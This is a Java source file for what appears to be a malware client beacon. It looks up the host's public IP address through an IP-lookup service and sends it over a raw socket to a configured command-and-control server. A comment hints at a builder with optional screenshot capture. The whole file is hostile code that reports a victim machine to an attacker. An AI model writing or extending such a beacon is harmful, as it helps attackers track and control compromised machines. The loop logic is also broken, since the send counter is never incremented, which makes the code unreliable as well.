package exs.client;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.PrintWriter;
import java.net.Socket;
//Screen Shot Support:NO

public class main {
    
    public static String GetIpAddr() {
        String Data = "0.0.0.0";
        String API_URL = "https://api.ipify.org";
        try {
            URL url = new URL(API_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            StringBuilder result = new StringBuilder();
            while ((line = rd.readLine()) != null) {
                result.append(line);
            }
            rd.close();
            return result.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "0.0.0.0";
        }

    }
    private static Socket socket = null;
    private static PrintWriter out = null;

    private static void createSocketAndWriter() {
        try {
            if (socket == null) {
                socket = new Socket(data.C2_SERVER_IP, data.C2_SERVER_PORT);
            }
            if (out == null) {
                out = new PrintWriter(socket.getOutputStream(), true);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private static void closeSocket() {
        try {
            if (socket != null) {
                socket.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private static void sendDataString(String d){
        try {
            if (socket != null){
                out.println(d);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void main(String[] args) {
        createSocketAndWriter();

        byte IpSentCount = 0;

        while(true) {

            if(IpSentCount>=1){
                closeSocket();
            } else {
                sendDataString("IP:"+GetIpAddr());
            }
        }
    }
    
    private static void log(String d) {
        System.out.println(d);
    }
}

